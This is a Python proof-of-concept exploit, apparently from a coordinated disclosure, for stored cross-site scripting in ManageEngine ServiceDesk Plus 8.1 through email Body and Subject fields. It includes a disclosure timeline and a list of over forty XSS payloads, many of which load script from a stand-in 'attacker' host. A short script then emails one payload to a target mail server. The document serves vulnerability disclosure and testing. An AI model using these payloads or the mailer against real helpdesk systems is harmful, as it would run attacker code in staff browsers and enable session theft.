#!/usr/bin/python

'''
Author: loneferret of Offensive Security
Product: ManageEngine Service Desk Plus (Windows standard)
Version: 8.1
Vendor Site: http://www.manageengine.com
Software Download: http://www.manageengine.com/products/service-desk/download.html

Timeline:
29 May 2012: Vulnerability reported to CERT
30 May 2012: Response received from CERT with disclosure date set to 20 Jul 2012
27 Jul 2012: Vendor requested additional information
30 Jul 2012: Additional proofs of concept provided to vendor
03 Aug 2012: Vendor acknowledged receipt of PoC and declares intent to fix
08 Aug 2012: Public Disclosure
06 Sep 2012: Update from Vendor. Issue fixed in ServiceDesk Plus build 8111.

Installed On: Windows Server 2003 SP2
Client Test OS: Window 7 Pro SP1 (x86)
Browser Used: Internet Explorer 9


Injection Point: Body
Injection Payload(s):
1: ';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>=&{}
2: <SCRIPT>alert('XSS')</SCRIPT>
3: <SCRIPT SRC=http://attacker/xss.js></SCRIPT>
4: <IFRAME SRC="javascript:alert('XSS');"></IFRAME>
5: exp/*<XSS STYLE='no\xss:noxss("*//*");
xss:&#101;x&#x2F;*XSS*//*/*/pression(alert("XSS"))'>
6: <IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
7: <XSS STYLE="xss:expression(alert('XSS'))">
8: <SCRIPT SRC="http://attacker/xss.jpg"></SCRIPT>
9: </TITLE><SCRIPT>alert("XSS");</SCRIPT>
10: <SCRIPT/XSS SRC="http://attacker/xss.js"></SCRIPT>
11: <SCRIPT SRC=//attacker/.j>
12: <<SCRIPT>alert("XSS");//<</SCRIPT>
13: <IMG """><SCRIPT>alert("XSS")</SCRIPT>">
14: <SCRIPT a=">" SRC="http://attacker/xss.js"></SCRIPT>
15: <SCRIPT ="blah" SRC="http://attacker/xss.js"></SCRIPT>
16: <SCRIPT a="blah" '' SRC="http://attacker/xss.js"></SCRIPT>
17: <SCRIPT "a='>'" SRC="http://attacker/xss.js"></SCRIPT>
18: <SCRIPT a=`>` SRC="http://attacker/xss.js"></SCRIPT>
19: <SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://attacker/xss.js"></SCRIPT>
20: <SCRIPT a=">'>" SRC="http://attacker/xss.js"></SCRIPT>

Injection Point: Subject
Injection Payload(s):
1: <SCRIPT>alert('XSS')</SCRIPT>
2: <SCRIPT SRC=http://attacker/xss.js></SCRIPT>
3: <SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
4: <DIV STYLE="width: expression(alert('XSS'));">
5: <IFRAME SRC="javascript:alert('XSS');"></IFRAME>
6: <META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
7: <META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
8: <IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
9: <XSS STYLE="xss:expression(alert('XSS'))">
10: <SCRIPT SRC="http://attacker/xss.jpg"></SCRIPT>
11: </TITLE><SCRIPT>alert("XSS");</SCRIPT>
12: <SCRIPT/XSS SRC="http://attacker/xss.js"></SCRIPT>
13: <SCRIPT SRC=http://attacker/xss.js
14: <SCRIPT SRC=//attacker/.j>
15: <IFRAME SRC=http://attacker/scriptlet.html <
16: <<SCRIPT>alert("XSS");//<</SCRIPT>
17: <IMG """><SCRIPT>alert("XSS")</SCRIPT>">
18: <SCRIPT a=">" SRC="http://attacker/xss.js"></SCRIPT>
19: <SCRIPT ="blah" SRC="http://attacker/xss.js"></SCRIPT>
20: <SCRIPT a="blah" '' SRC="http://attacker/xss.js"></SCRIPT>
21: <SCRIPT "a='>'" SRC="http://attacker/xss.js"></SCRIPT>
22: <SCRIPT a=`>` SRC="http://attacker/xss.js"></SCRIPT>
23: <SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://attacker/xss.js"></SCRIPT>
24: <SCRIPT a=">'>" SRC="http://attacker/xss.js"></SCRIPT>

'''

import smtplib, urllib2

payload = """</TITLE><SCRIPT>alert("XSS");</SCRIPT>"""

def sendMail(dstemail, frmemail, smtpsrv, username, password):
        msg  = "From: hacker@offsec.local\n"
        msg += "To: victim@victim.local\n"
        msg += 'Date: Today\r\n'
        msg += "Subject: XSS" + payload + "\n"
        msg += "Content-type: text/html\n\n"
        msg += "XSS.\r\n\r\n"
        server = smtplib.SMTP(smtpsrv)
        server.login(username,password)
        try:
                server.sendmail(frmemail, dstemail, msg)
        except Exception, e:
                print "[-] Failed to send email:"
                print "[*] " + str(e)
        server.quit()

username = "hacker@offsec.local"
password = "123456"
dstemail = "victim@victim.local"
frmemail = "hacker@offsec.local"
smtpsrv  = "172.16.84.171"

print "[*] Sending Email"
sendMail(dstemail, frmemail, smtpsrv, username, password)